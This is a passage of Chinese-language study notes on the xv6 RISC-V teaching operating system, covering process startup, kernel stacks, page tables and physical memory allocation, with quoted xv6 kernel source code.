class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个进程都有一个执行线程（或简称线程）来执行进程的指令。一个线程可以挂起并且稍后再恢复</p><p>每个线程有两个栈区，一个user的stack，一个kernel的stack：<code>p-&gt;kstack</code></p><p>当进程执行用户指令时，只有它的用户栈在使用，它的内核栈是空的。当进程进入内核（由于系统调用或中断）时，内核代码在进程的内核堆栈上执行；当一个进程在内核中时，它的用户堆栈仍然包含保存的数据，只是不处于活动状态。进程的线程在主动使用它的用户栈和内核栈之间交替。内核栈是独立的（并且不受用户代码的保护），因此即使一个进程破坏了它的用户栈，内核依然可以正常运行。</p><p>一个进程可以通过执行RISC-V的<code>ecall</code>指令进行系统调用，该指令提升硬件特权级别，并将程序计数器（PC）更改为内核定义的入口点，，入口点的代码切换到内核栈，执行实现系统调用的内核指令，当系统调用完成时，内核切换回用户栈，并通过调用<code>sret</code>指令返回用户空间，该指令降低了硬件特权级别，并在系统调用指令刚结束时恢复执行用户指令。进程的线程可以在内核中“阻塞”等待I&#x2F;O，并在I&#x2F;O完成后恢复到中断的位置。</p><h2 id="2-3-启动XV6的第一个程序"><a href="#2-3-启动XV6的第一个程序" class="headerlink" title="2.3 启动XV6的第一个程序"></a>2.3 启动XV6的第一个程序</h2><p>初始化自己并运行一个存储在只读内存中的引导加载程序。引导加载程序将xv6内核加载到内存中，之后在机器模式下CPU从<code>_entry</code>开始运行，动时页式硬件（paging hardware）处于禁用模式：也就是说虚拟地址将直接映射到物理地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">_entry:</span><br><span class="line"># set up a stack for C.</span><br><span class="line"># stack0 is declared in start.c,</span><br><span class="line"># with a 4096-byte stack per CPU.</span><br><span class="line"># sp = stack0 + (hartid * 4096)</span><br><span class="line">la sp, stack0</span><br><span class="line">li a0, 1024*4</span><br><span class="line">csrr a1, mhartid</span><br><span class="line">addi a1, a1, 1</span><br><span class="line">mul a0, a0, a1</span><br><span class="line">add sp, sp, a0</span><br><span class="line"># jump to start() in start.c</span><br><span class="line">call start</span><br></pre></td></tr></table></figure><p>设置好栈区之后调用start，<code>start</code>执行一些仅在机器模式下允许的配置，然后切换到管理模式(<code>mret</code>指令)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// set M Previous Privilege mode to Supervisor, for mret.</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> x = r_mstatus();</span><br><span class="line">x &amp;= ~MSTATUS_MPP_MASK;</span><br><span class="line">x |= MSTATUS_MPP_S;</span><br><span class="line">w_mstatus(x);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set M Exception Program Counter to main, for mret.</span></span><br><span class="line"><span class="comment">// requires gcc -mcmodel=medany</span></span><br><span class="line">w_mepc((uint64)main);</span><br><span class="line"></span><br><span class="line"><span class="comment">// disable paging for now.</span></span><br><span class="line">w_satp(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// delegate all interrupts and exceptions to supervisor mode.</span></span><br><span class="line">w_medeleg(<span class="number">0xffff</span>);</span><br><span class="line">w_mideleg(<span class="number">0xffff</span>);</span><br><span class="line">w_sie(r_sie() | SIE_SEIE | SIE_STIE | SIE_SSIE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ask for clock interrupts.</span></span><br><span class="line">timerinit();</span><br><span class="line"></span><br><span class="line"><span class="comment">// keep each CPU&#x27;s hartid in its tp register, for cpuid().</span></span><br><span class="line"><span class="keyword">int</span> id = r_mhartid();</span><br><span class="line">w_tp(id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch to supervisor mode and jump to main().</span></span><br><span class="line"><span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;mret&quot;</span>)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>mret</code>后会导致PC的值为main的地址<code>kernel/main.c</code></p><blockquote><p>  <strong>注：</strong><code>mret</code>执行返回，返回到先前状态，由于<code>start</code>函数将前模式改为了管理模式且返回地址改为了<code>main</code>,因此<code>mret</code>将返回到<code>main</code>函数，并以管理模式运行</p></blockquote><p><code>main</code>初始化几个设备和子系统后，调用<code>userinit</code>创建第一个进程（<code>kernel/proc.c</code>），第一个进程执行一个用RISC-V程序集写的小型程序：<strong>initcode. S</strong>，调用<code>exec</code>系统调用重新进入内核，<code>exec</code>使用用 <code>/init</code>（<strong>user&#x2F;init.c</strong>）替换当前进程的内存和寄存器。一旦内核完成<code>exec</code>，它就返回<code>/init</code>进程中的用户空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Initial process that execs /init.</span><br><span class="line"># This code runs in user space.</span><br><span class="line"></span><br><span class="line">#include &quot;syscall.h&quot;</span><br><span class="line"></span><br><span class="line"># exec(init, argv)</span><br><span class="line">.globl start</span><br><span class="line">start:</span><br><span class="line">        la a0, init</span><br><span class="line">        la a1, argv</span><br><span class="line">        li a7, SYS_exec</span><br><span class="line">        ecall</span><br><span class="line"></span><br><span class="line"># for(;;) exit();</span><br><span class="line">exit:</span><br><span class="line">        li a7, SYS_exit</span><br><span class="line">        ecall</span><br><span class="line">        jal exit</span><br><span class="line"></span><br><span class="line"># char init[] = &quot;/init\0&quot;;</span><br><span class="line">init:</span><br><span class="line">  .string &quot;/init\0&quot;</span><br><span class="line"></span><br><span class="line"># char *argv[] = &#123; init, 0 &#125;;</span><br><span class="line">.p2align 2</span><br><span class="line">argv:</span><br><span class="line">  .long init</span><br><span class="line">  .long 0</span><br></pre></td></tr></table></figure><p>之后的<code>/init</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//user.init.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid, wpid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (open(<span class="string">&quot;console&quot;</span>, O_RDWR) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">mknod(<span class="string">&quot;console&quot;</span>, CONSOLE, <span class="number">0</span>);</span><br><span class="line">open(<span class="string">&quot;console&quot;</span>, O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line">dup(<span class="number">0</span>); <span class="comment">// stdout</span></span><br><span class="line">dup(<span class="number">0</span>); <span class="comment">// stderr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;init: starting sh\n&quot;</span>);</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;init: fork failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">exec(<span class="string">&quot;sh&quot;</span>, argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;init: exec sh failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// this call to wait() returns if the shell exits,</span></span><br><span class="line"><span class="comment">// or if a parentless process exits.</span></span><br><span class="line">wpid = wait((<span class="keyword">int</span> *)<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (wpid == pid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// the shell exited; restart it.</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (wpid &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;init: wait returned an error\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// it was a parentless process; do nothing.</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Chapter-3-Page-tables"><a href="#Chapter-3-Page-tables" class="headerlink" title="Chapter 3:Page tables"></a>Chapter 3:Page tables</h1><p>页表是操作系统为每个进程提供自己的私有地址空间和内存的机制。页表决定了内存地址的含义，以及物理内存的哪些部分可以访问。</p><h2 id="3-1-分页硬件"><a href="#3-1-分页硬件" class="headerlink" title="3.1 分页硬件"></a>3.1 分页硬件</h2><p>XV6基于Sv39 RISC-V运行，只使用64位虚拟地址的低39位；而<strong>高25位不使用</strong>。在这种Sv39配置中，RISC-V页表在逻辑上是一个由$2^{27}$（134,217,728）个<strong>页表条目（Page Table Entries&#x2F;PTE）</strong>组成的数组。每个PTE包含一个44位的<strong>物理页码（Physical Page Number&#x2F;PPN）</strong>和一些标志。页式硬件通过使用虚拟地址39位中的前27位索引页表，以找到该虚拟地址对应的一个PTE，然后生成一个56位的物理地址，其前44位来自PTE中的PPN，其后12位来自原始虚拟地址。如下图3.1，页表的逻辑视图是一个简单的PTE数组如图3.2。页表通过逻辑到物理地址的转换给了操作系统控制权，转换的粒度是一个个对齐的物理块（一个物理块包含$2^{12}&#x3D;4096$字节），这样的块称为页。</p><p><img src="/2022/07/12/XV6/p1.png"></p><p><img src="/2022/07/12/XV6/p2.png"></p><p>如果转换地址所需的三个PTE中的任何一个不存在，页式硬件就会引发页面故障异常，并让内核来处理该异常</p><p>每个<code>PTE</code>包含的标志位（在<code>kernel/riscv.h</code>中定义）：</p><ul><li><code>PTE_V</code>指示PTE是否存在：如果它没有被设置，对页面的引用会导致异常（即不允许）。</li><li><code>PTE_R</code>控制是否允许指令读取到页面。</li><li><code>PTE_W</code>控制是否允许指令写入到页面。</li><li><code>PTE_X</code>控制CPU是否可以将页面内容解释为指令并执行它们。</li><li><code>PTE_U</code>控制用户模式下的指令是否被允许访问页面；如果没有设置<code>PTE_U</code>，PTE只能在管理模式下使用。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGSIZE 4096 <span class="comment">// bytes per page</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGSHIFT 12  <span class="comment">// bits of offset within a page</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGROUNDUP(sz)  (((sz)+PGSIZE-1) &amp; ~(PGSIZE-1))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGROUNDDOWN(a) (((a)) &amp; ~(PGSIZE-1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_V (1L &lt;&lt; 0) <span class="comment">// valid</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_R (1L &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_W (1L &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_X (1L &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_U (1L <span class="meta-string">&lt;&lt; 4) // 1 -&gt;</span> user can access</span></span><br></pre></td></tr></table></figure><p>为了告诉硬件使用页表，内核必须将根页表页的物理地址写入到<code>satp</code>寄存器中（<code>satp</code>的作用是存放根页表页在物理内存中的地址）。每个CPU都有自己的<code>satp</code>。一个CPU将使用自己的<code>satp</code>指向的页表转换后续指令生成的所有地址。每个CPU都有自己的<code>satp</code>，这样不同的CPU就可以运行不同的进程，每个CPU都有自己的页表描述的私有地址空间。</p><p>物理内存以一个字节为单位划为地址，称为物理地址。</p><h2 id="3-2-内核地址空间"><a href="#3-2-内核地址空间" class="headerlink" title="3.2 内核地址空间"></a>3.2 内核地址空间</h2><p><strong>kernel&#x2F;memlayout.h</strong>声明了xv6内核内存布局的常量，内存映射：</p><img src="/2022/07/12/XV6/p3.png" alt="img" style="zoom: 80%;"><p>QEMU模拟了一台计算机，它包括从物理地址<code>0x80000000</code>开始，到<code>0x86400000</code>结束的RAM（物理内存），<code>KERNBASE</code>和<code>PHYSTOP</code>；QEMU还模拟了IO等设备。</p><p>有几个内核虚拟地址不是直接映射：</p><ul><li><code>trampoline page</code>。映射在虚拟地址空间的顶部；用户页表具有相同的映射。</li><li>内核栈页面。每个进程都有自己的内核栈，它将映射到偏高一些的地址，这样xv6在它之下就可以留下一个未映射的保护页(<strong>guard page)<strong>。保护页的PTE是无效的（也就是说<code>PTE_V</code>没有设置），所以如果内核溢出内核栈就会引发一个异常，内核触发<code>panic</code>。如果没有保护页，栈溢出将会覆盖其他内核内存，引发错误操作。（注：Guard page不会浪费物理内存，它只是占据了虚拟地址空间的一段靠后的地址，但并</strong>不映射到物理地址空间</strong>。）</li></ul><h2 id="3-3-建立一个地址空间"><a href="#3-3-建立一个地址空间" class="headerlink" title="3.3 建立一个地址空间"></a>3.3 建立一个地址空间</h2><p>大多数用于操作地址空间和页表的xv6代码都写在<strong>kernel&#x2F;vm.c</strong>中，核心数据结构是<code>pagetable_t</code>(uint64)，一个<code>pagetable_t</code>可以是内核页表，也可以是一个进程页表。</p><p>最核心的函数是<code>walk</code>和<code>mappages</code>，前者为虚拟地址找到PTE，后者为新映射装载PTE。名称以<code>kvm</code>开头的函数操作内核页表；以<code>uvm</code>开头的函数操作用户页表；其他函数用于二者。<code>copyout</code>和<code>copyin</code>复制数据到用户虚拟地址或从用户虚拟地址复制数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kvminit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">kernel_pagetable = (<span class="keyword">pagetable_t</span>)kalloc();</span><br><span class="line"><span class="built_in">memset</span>(kernel_pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// uart registers</span></span><br><span class="line">kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// virtio mmio disk interface</span></span><br><span class="line">kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// CLINT</span></span><br><span class="line">kvmmap(CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// PLIC</span></span><br><span class="line">kvmmap(PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// map kernel text executable and read-only.</span></span><br><span class="line">kvmmap(KERNBASE, KERNBASE, (uint64)etext - KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line"><span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">kvmmap((uint64)etext, (uint64)etext, PHYSTOP - (uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// map the trampoline for trap entry/exit to</span></span><br><span class="line"><span class="comment">// the highest virtual address in the kernel.</span></span><br><span class="line">kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在最开始<code>main</code>调用<code>kvninit</code> 来创建内核的页表。这个调用发生在xv6使能RISC-V分页之前，所以地址直接引用物理内存。</p><p>首先分配一个物理页保存根页表页，之后调用<code>kvmmap</code>装载内核需要的转换，</p><p><code>kvmmap</code>：调用<code>mappages</code>，<code>mappages</code>将范围虚拟地址到同等范围物理地址的映射装载到一个页表中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add a mapping to the kernel page table.</span></span><br><span class="line"><span class="comment">// only used when booting.</span></span><br><span class="line"><span class="comment">// does not flush TLB or enable paging.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kvmmap</span><span class="params">(uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (mappages(kernel_pagetable, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kvmmap&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>walk</code>：为虚拟地址找到PTE，模仿RISC-V分页硬件。每次从三级页表中读9位，使用上一级的9位虚拟地址来查找下一级页表或最终页面的PTE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Return the address of the PTE in page table pagetable</span></span><br><span class="line"><span class="comment">// that corresponds to virtual address va.  If alloc!=0,</span></span><br><span class="line"><span class="comment">// create any required page-table pages.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The risc-v Sv39 scheme has three levels of page-table</span></span><br><span class="line"><span class="comment">// pages. A page-table page contains 512 64-bit PTEs.</span></span><br><span class="line"><span class="comment">// A 64-bit virtual address is split into five fields:</span></span><br><span class="line"><span class="comment">//   39..63 -- must be zero.</span></span><br><span class="line"><span class="comment">//   30..38 -- 9 bits of level-2 index.</span></span><br><span class="line"><span class="comment">//   21..29 -- 9 bits of level-1 index.</span></span><br><span class="line"><span class="comment">//   12..20 -- 9 bits of level-0 index.</span></span><br><span class="line"><span class="comment">//    0..11 -- 12 bits of byte offset within the page.</span></span><br><span class="line"><span class="function"><span class="keyword">pte_t</span> *<span class="title">walk</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 va, <span class="keyword">int</span> alloc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (va &gt;= MAXVA)</span><br><span class="line">panic(<span class="string">&quot;walk&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">2</span>; level &gt; <span class="number">0</span>; level--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">pte_t</span> *pte = &amp;pagetable[PX(level, va)];</span><br><span class="line"><span class="keyword">if</span> (*pte &amp; PTE_V)</span><br><span class="line">&#123;</span><br><span class="line">pagetable = (<span class="keyword">pagetable_t</span>)PTE2PA(*pte);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!alloc || (pagetable = (<span class="keyword">pde_t</span> *)kalloc()) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line">*pte = PA2PTE(pagetable) | PTE_V;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;pagetable[PX(<span class="number">0</span>, va)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>kvninit</code>结束后，<code>main</code>调用<code>kvminithart</code>来安装内核页表。它将根页表页的物理地址写入寄存器<code>satp</code>。之后，CPU将使用内核页表转换地址。由于内核使用标识映射，下一条指令的当前虚拟地址将映射到正确的物理内存地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Switch h/w page table register to the kernel&#x27;s page table,</span></span><br><span class="line"><span class="comment">// and enable paging.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kvminithart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">w_satp(MAKE_SATP(kernel_pagetable));</span><br><span class="line">sfence_vma();<span class="comment">// flush the TLB.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后<code>main</code>调用<code>procinit</code>，为每个进程分配一个内核栈，它将每个栈映射到<code>KSTACK</code>生成的虚拟地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initialize the proc table at boot time.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">procinit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">initlock(&amp;pid_lock, <span class="string">&quot;nextpid&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (p = proc; p &lt; &amp;proc[NPROC]; p++)</span><br><span class="line">&#123;</span><br><span class="line">initlock(&amp;p-&gt;lock, <span class="string">&quot;proc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page for the process&#x27;s kernel stack.</span></span><br><span class="line"><span class="comment">// Map it high in memory, followed by an invalid</span></span><br><span class="line"><span class="comment">// guard page.</span></span><br><span class="line"><span class="keyword">char</span> *pa = kalloc();</span><br><span class="line"><span class="keyword">if</span> (pa == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">uint64 va = KSTACK((<span class="keyword">int</span>)(p - proc));</span><br><span class="line">kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">p-&gt;kstack = va;</span><br><span class="line">&#125;</span><br><span class="line">kvminithart();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个RISC-V CPU都将页表条目缓存在转译后备缓冲器（快表&#x2F;TLB）中，RISC-V有一个指令<code>sfence.vma</code>，用于刷新当前CPU的TLB</p><h2 id="3-4-物理内存分配"><a href="#3-4-物理内存分配" class="headerlink" title="3.4 物理内存分配"></a>3.4 物理内存分配</h2><p><code>kalloc</code>代码位于<code>kernelkalloc.c</code>，<code>kalloc</code>的数据结构是可供分配的物理内存页的空闲列表，空闲列表受到自旋锁（spin lock）的保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocate one 4096-byte page of physical memory.</span></span><br><span class="line"><span class="comment">// Returns a pointer that the kernel can use.</span></span><br><span class="line"><span class="comment">// Returns 0 if the memory cannot be allocated.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">acquire(&amp;kmem.lock);</span><br><span class="line">r = kmem.freelist;</span><br><span class="line"><span class="keyword">if</span> (r)</span><br><span class="line">kmem.freelist = r-&gt;next;</span><br><span class="line">release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r)</span><br><span class="line"><span class="built_in">memset</span>((<span class="keyword">char</span> *)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main</code>调用<code>kinit</code>来初始化分配器，<code>kinit</code>初始化空闲列表以保存从内核结束到<code>PHYSTOP</code>之间的每一页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 